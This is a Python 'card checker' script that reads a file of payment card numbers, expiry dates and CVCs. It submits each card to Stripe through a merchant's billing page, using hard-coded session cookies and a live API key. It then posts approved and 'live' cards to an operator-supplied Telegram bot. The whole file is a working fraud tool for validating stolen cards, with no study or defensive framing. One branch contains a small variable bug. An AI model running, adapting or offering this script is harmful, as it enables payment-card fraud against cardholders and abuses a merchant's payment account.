from colorama import Fore, Back, Style
import requests
import time
from datetime import datetime
import pyfiglet
import os
import platform
import webbrowser      

Z =  '\033[1;31m' 
F = '\033[2;32m' 
B = '\033[2;36m'
X = '\033[1;33m' 
C = '\033[2;35m'


logo = pyfiglet.figlet_format('		                  	MODCA ')
print(Z+logo)
 
Z =  '\033[1;31m' 
F = '\033[2;32m' 
B = '\033[2;36m'
X = '\033[1;33m' 
C = '\033[2;35m'

combo=input(C+'      Enter Combo ➠'+C)
file=open(f'{combo}',"+r")
token = input(C+'      Enter Token ➠'+C)
ID = input(C+'      Enter ID'+C)
start_num = 0
for P in file.readlines():
	start_num += 1
	n = P.split('|')[0]
	mm=P.split('|')[1]
	yy=P.split('|')[2][-2:]
	cvc=P.split('|')[3].replace('\n', '')
	P=P.replace('\n', '')
	time.sleep(5)
	cookies = {
    '_fbp': 'fb.1.1720536565202.267774941982572524',
    'intercom-device-id-goppktf8': '20dc800a-6f05-4404-9e49-4100c4ae76be',
    '__stripe_mid': '01d46866-8c87-4056-b3b4-3ed209a09cdb61cc05',
    'ls_customer': 'c050282089cdfa1f85a6e1e693251054',
    'remember_web_59ba36addc2b2f9401580f014c7f58ea4e30989d': 'eyJpdiI6Imk3aTlVdUFORkpIbzNFU0IyR1lyRmc9PSIsInZhbHVlIjoiUnhVTzZDalpyeHBnSFE4QTI5cmY0bjFRRVdRZTAxaFJRNHgxS3NqbGIzWFpYMlM5dDAxcXQ1Y3Rjc3BqRUQ2WlVuMjJDY0RWeks5dmdqaXBwdStHcEVkM2tqWXlXclF0Z25ldGxselRZUnJ5Zkp3RWlMNlNRbURZTnVUQ3cxNDcrK1B2QXhrbGlxVk00VTFCYk1NT25LZTdNbStnQkNaRzhuQi83MDRYa0dpR0thR3cyOEpTZFAyS1ZjeEtpWVlQaVpoYWJsSkR1Vk44ZW42ak41dkd1UlZyb3kvU2hoMmk4Q0RwdCt2aDYyZz0iLCJtYWMiOiI2ZGFmNTM2MDFkMzFlNzAwZDkyMzg1YjI2NTRkMDMzNmZjM2U4Njk5ZDcxNmY0NTVlYzExNzljNDI2ODE2NTIwIiwidGFnIjoiIn0%3D',
    'intercom-session-goppktf8': 'MWkyYlFtQWNrQmRXcXBQOTg1bVRXN3dmMkhqcDAvK0VCelowam1DSytldEx1N3hNSVJhRUZUeEVxdjQ0Y0JGby0tbmJWNmttV205V2JsTGNBdjBHd3l2dz09--52b4ef8879a9489064fdc9f681fc89220bb7a417',
    'laravel_token': 'eyJpdiI6IjRIU3NabnhKZXh0Uy83VkhJcEhmMEE9PSIsInZhbHVlIjoidklpVk5CV3MvRjhUQ29CRFlVVERrMSt5cEN4dmUrdjRVVXNsYzBrYnNiUE5sYW9hZFZCMnJXbzV6WUs3VEdUS0J0alQ2M1RqU1U5cUI1Z1o2MytSWWhxZXlVdDNpdE5wUUhHTE53WFk4MU5jOS90aTFsRExmWGRvekVLSHJBbSt2bVptbExFanFLQTZncFFwTjAxS0NJVUlFVlN5ZzVEd29HZWtpY3lWMy9vdUx3cXVDTEtFUis5WTUvY09iRWlodzI4dFBWeFh0Rm1QUzNYNzl2Qm5TOGNRV1B2M3NGNkQxUHVuSFE1Mk5NMlpkeUtEZDQ3TnM3OXRlQWQ3WjFLQ2hqbmlBb1A3bmVMd0NLUS85ZDBSNkNqMEtUeXZqcDRlbW9MZy9Pd1JzMi9QNXJpVTNGc2xJM281YmJJOTM3UksiLCJtYWMiOiIyMGYwY2MyYjkyZmFkMDgzOGUzZjMyNDM2ZGNjYjNiNDk5OTA2NjdkZTRmN2E5MmUyNzgyMTI4MGJkNWVjZmE3IiwidGFnIjoiIn0%3D',
    'XSRF-TOKEN': 'eyJpdiI6InFQVklMaWRGNjdzZ2c5WXpLVXJJTlE9PSIsInZhbHVlIjoiNTBwaGsrK0I2cGZpdDFjbEpWaEpYNmFvYmZlVUlBQkFYaFNVVlMycWRpaFI0Q1pjOGxnY3pIRmViVkhzMkY1U1hsQ3NXZVpLb3VaRXJ3YWFoWlFZNGRqS29oSCtYR09UcytOZVVkdmVrQ2EzWmhXaTZ1czcwVHduc3Z1bjQvK24iLCJtYWMiOiJiMzA4ZGI3MmE2YmNhYmE3MzUzMjA4YzllYWY0NDY4MGExZDJjZjU5NjQ1ODg3M2Y5NTM0MWY1MTQxOTI5MzNmIiwidGFnIjoiIn0%3D',
    'laravel_session': 'eyJpdiI6IlZpem5BL1hWR0UvWjl3b3Q0Y0Vvcmc9PSIsInZhbHVlIjoiRmdRMWhMOHhnakRGd280SEJqakNHUlhYSGZYWlo5VXhyVGlIekNISmZOZnVyV3E2Nm9mN2Nha1JOaEZVRlF5R3B6WmtGdml0QWxnMzU4bDJuWFFhdU5XVzJaTWdKSG9JZjl0RXZQeWFhOEJuUFpEQStRUnNKT1RxcnptT09tdFIiLCJtYWMiOiJjOGNhOGQxYzllNTZiMTcyMmIwZjk2MWVmOTQ5YjIwOTQzNjU3ZmQwMDNiNGE3Y2QxYzI1NGE1NTEwZDk1N2VmIiwidGFnIjoiIn0%3D',
}


	headers = {
    'authority': 'app.lemonsqueezy.com',
    'accept': 'text/html, application/xhtml+xml',
    'accept-language': 'en-US,en;q=0.9',
    'referer': 'https://app.lemonsqueezy.com/store/billing/card',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    'x-inertia': 'true',
    'x-inertia-version': 'f2d2fecf98fae6663f251cb5f37b66b4',
    'x-requested-with': 'XMLHttpRequest',
    'x-xsrf-token': 'eyJpdiI6IjVVMEZEV0FNR21nczVFRFpmZUQ5ZWc9PSIsInZhbHVlIjoiV2oxaVpjYmpadXZ1NE0xRE5PbWJNOXREZ0l1MmZFc0lud0tXSHZZdUV0TTZtanIxVWVJODlaZHhGN0lpOWw2RjhOZERpc2VvZnlIVzNDOE4xV2VUYmtaRkYxOGo3L0s0T2ZkbFpCNnQyN2lSSitiaGU3bUV5UnN0dVordTRFOHMiLCJtYWMiOiJhNjEyNTUxMzhhYjFhODY5M2Y2Njk3NGU3YjViNThkYzQ2ZWMyNWVkYzliMTk4M2I0ZjIwNDhmYTQxYmU0M2RjIiwidGFnIjoiIn0=',
}

	r1 = requests.get('https://app.lemonsqueezy.com/store/billing/card', cookies=cookies, headers=headers)
	st=(r1.json()['props']['panelData']['props']['clientSecret'])
	st1=st.split('_secret_')[0]
	time.sleep(5)
	headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

	data = f'payment_method_data[type]=card&payment_method_data[billing_details][name]=Kane+Brown&payment_method_data[billing_details][address][country]=US&payment_method_data[billing_details][address][postal_code]=10080&payment_method_data[billing_details][address][state]=New+York&payment_method_data[card][number]={n}&payment_method_data[card][cvc]={cvc}&payment_method_data[card][exp_month]={mm}&payment_method_data[card][exp_year]={yy}&payment_method_data[guid]=NA&payment_method_data[muid]=01d46866-8c87-4056-b3b4-3ed209a09cdb61cc05&payment_method_data[sid]=NA&payment_method_data[payment_user_agent]=stripe.js%2Fda8104573f%3B+stripe-js-v3%2Fda8104573f%3B+card-element&payment_method_data[referrer]=https%3A%2F%2Fapp.lemonsqueezy.com&payment_method_data[time_on_page]=71609&expected_payment_method_type=card&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.hadwYXNza2V5xQYfqJKAJXh4HmXitoYvpQWL_LCyg3IYOxRwO_eEstY2cks3ibkGRyTP2LhcAXHBJAe7XWkITltl57d7RPV8qY1nq31lJpkCk29HuRUvJq5FZulV0NXnO6g6_3nNwFDri_38wMMfz40xWu94eokQr7_iCR4UE2D0T-m9XoXWV9Ryq1pq2RPnZHK0-zhkIZ1-7yVrcQwnSSZooCrOTLARJFEOlwU-6pChL53DR1bASm-ziK3n4zXL2u4QHo3R1S7l6Kpxkr8Vd0FYi6qvyaLOLMvbwj9p_RjMbPe0QAeEOQv7f1BleMCEQ32oGKbOAuLHfm65Np5GLcs6RDUUJNoGYNMBf-CZeKZKhlS1dmwllAuxmUVQ5kxzp4AdQWVHG0inh07mS2SDXFKocZ6cuyTJjBFFG_1ZNQTA4ad3RZqbRPuBFscjm9sjQ7vjAzYR__rvhdSJKAWUWiilyFUPcoeh1j1E6xH5SlvRGLQzhQPwfx-A75YP8Y-EeG5U3jNSGGYI3MYlXnViyCjYrix5DsrhwLn3taSOIlj-wK9qas-UNdb1zsfckc85TOhRZfQXq0sQhWEg7sDVvEUqWC7lUnh7OBTcMDKR_kzosXQNhllkn-JJopWSClGOlvSjQ-ZzCLMlxnx1V5V1w_BhqYZcE6L_YY_k_IDLu4--FK6gx7-GqEcaiSr2clJbzT3Gu-ctiqjlvvfQYabj2GKQ9nrEf01iMh7FNTEfbGnXlEejxHgwXr9rnenx8zO8JtXYerfvX1iz7py1p42E_dRSuXZ0d3h3O6GYbPbTzAWL4KAPjqS3CHQMi6pqy5A42-v3l-Votsa7FLYkTg31z0mVIlhgfdodCqbHDy7tJSWmN5ndD5a4AlR2eFVlJVbSuoNcaXqXKuB0brLQC4BmgLRZRE30nfYJR9Bxwc_25kTb46WNUzINZSJOOcV62fpY9FkpyicEw_zbPSzaz9sCyiLs4fmg5Tv5egUOndzl03pWaSji9rfQ-4H7BEhgsOXGHAIKzDjPwhmLaLksAbet3oGxXME0u5gJ2M6_0C4ZUlkImk4SQIALxC09O_7HfoYo_fUA5talQMhUyCY3tL2E5AkVRlNl4EFerLtJQt51yXQleG-9P_8GvooFczKzQGBuHXopjqWMC6y-_gwXPy4CtXlkVK5XKVZG4wWpZJlA0NkdDI8VX-S035K48RT9VUd5fSqtvnQTAfgkQjAMJwKyqoiA-4lqMHpYrsQIuIMQSzs-URZc6q1rdwvJZmoTcs3cfpxX2ErELbP9JR0TWxOGftCssb7qKWFWlDPgO1E6o02sJTkQIuyhaBK7-EAdDx4KnOuRZqiBRtQ2CjJVZGRa_UFDLaWASYFvCnQpMxzQuLqUej-Tgk7yRwRVxsJOhTOo0nhQbBLcVjazQc1HUjeKFargUmY-Zy1RQLy_Zy-qSipDjYo99hlJc0dUJu7m56wEJyjur5MvHxuFuXC3j1EFC3ZBaWh_cK0oLpaqE1rS8-7KWsdo3MfYp0YPdM2aqPOcprbgap85LkEfdVEbWfyIpccx2ig5gd2VodxZi6nYineqXg8U3X8pasDtDZ6_lVaqKDfkVqt-Kw03uwzC5FJNDkUo9HSQaMMiNjgvQ90hvSpbndp_COYVnTrQwYsEglHWXy-mNvHP9kNoiYrSSHFdgEWqGmKFWjYbGMui7AhxGPK6n8Ze97chDslwYI7KdKTNPyckZrUH4X1lOpLb89Fm1fGtkTCyAdUQC9KffvNeaxFjN1RnfiHBU4Af_6XOl2sZYsLjMY_B6d9MBG2EZWhkA16F71M2yilsYHSGegKtkZ532oDQPWm-g6gqFvzWRiICmJsOniQ3MqPVyQuI2vsC0fGjR0KvJRFAOpfQF_M4RmqnwPmtg4lbFTMcb_FeqSzaPYA-drlMDEgl9rzz11dF9KVUYIz3TBIj-HanVeMa21cqeJ41d2wdhbL9SOWGU8B1ZVy5H3KJN0Zh20aQFTmPr4cn2kXLKq8u--X3QnTYOMbfeRtEEw04K83J6ZT12hu7N8UnX1jfb8dLFZQsqgFxAjFx8mhEAVo09P1NVP9yYplhyyY21q8Fakx-n6NleHDOZpaEj6hzaGFyZF9pZM4VmeRUomtyqDNiODExYWMyonBkAA.CJsIx2qEcOjUWis-lzvPx193A-NnoEuLk3NHfss0lXM&use_stripe_sdk=true&key=pk_live_51Jgu2GICFkNQwM9ZaMW5V0hVD8Dgu6frELjJeE23b7kOU60ROveOOAM6Cd0NidMaN5lxPjnnKgYCjPqKMtWKsSUf00W3Osyk61&client_secret={st}'

	time.sleep(5)
	r2 = requests.post(
    f'https://api.stripe.com/v1/setup_intents/{st1}/confirm',
    headers=headers,
    data=data,
)

	if "succeeded" in r2.text:
		print(F+f'[ {start_num} ]',P,' ➠➠ 𝑎𝑝𝑝𝑟𝑜𝑣𝑒𝑑 ✅')
		mgs1=f'''✘ 𝑠𝑢𝑐𝑐𝑒𝑒𝑑𝑒𝑑 ✅
✘ 𝑎𝑝𝑝𝑟𝑜𝑣𝑒𝑑 ✅
✘ 𝑐𝑐  ➠ {P}
✘ 𝑟𝑒𝑠𝑢𝑙𝑡 ➠ 𝑎𝑝𝑝𝑟𝑜𝑣𝑒𝑑
✘ 𝑔𝑎𝑡𝑒𝑤𝑎𝑦 ➠ 𝑠𝑡𝑟𝑖𝑝𝑒 𝑎𝑢𝑡ℎ 
━━━━━━━━━━━━━━━━━  
✘ 𝑏𝑦 ➠ @B_6_Q '''
		modca = f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={mgs1}"
		i = requests.post(modca)
	elif "insufficient funds" in r2.text:
		print(F+f'[ {start_num} ]',P,' ➠➠ 𝑎𝑝𝑝𝑟𝑜𝑣𝑒𝑑  ✅(Low balance)')
		m1gs=f'''✘ 𝑎𝑝𝑝𝑟𝑜𝑣𝑒𝑑 ✅
✘ 𝑐𝑐 ➠ {P}
✘ 𝑟𝑒𝑠𝑢𝑙𝑡 ➠ 𝑎𝑝𝑝𝑟𝑜𝑣𝑒𝑑 ✅( 𝑙𝑜𝑤 𝑏𝑎𝑙𝑎𝑛𝑐𝑒  ) 
━━━━━━━━━━━━━━━━━  
✘ 𝑏𝑦 ➠ @B_6_Q '''
		modca2 = f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={m1gs}"
		i = requests.post(modca2)
	elif "security code is incorrect" in r2.text or "ZIP INCORRECT" in r2.text:
		print(F+f'[ {start_num} ]',P,' ➠➠ 𝑎𝑝𝑝𝑟𝑜𝑣𝑒𝑑 ✅(CCN LIVE)')
		msog=f'''✘ 𝑎𝑝𝑝𝑟𝑜𝑣𝑒𝑑 ✅
✘ 𝑐𝑐  ➠ {P}
✘ 𝑟𝑒𝑠𝑢𝑙𝑡 ➠ 𝑎𝑝𝑝𝑟𝑜𝑣𝑒𝑑 ✅( 𝑐𝑐𝑛 𝑙𝑖𝑣𝑒  ) 
━━━━━━━━━━━━━━━━━  
✘ 𝑏𝑦 ➠ @B_6_Q '''
		modca3 = f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={modca3}"
		i = requests.post(modca3)
		
	else:
		print(Z+f'[ {start_num} ]',P,' ➠➠ 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌')	
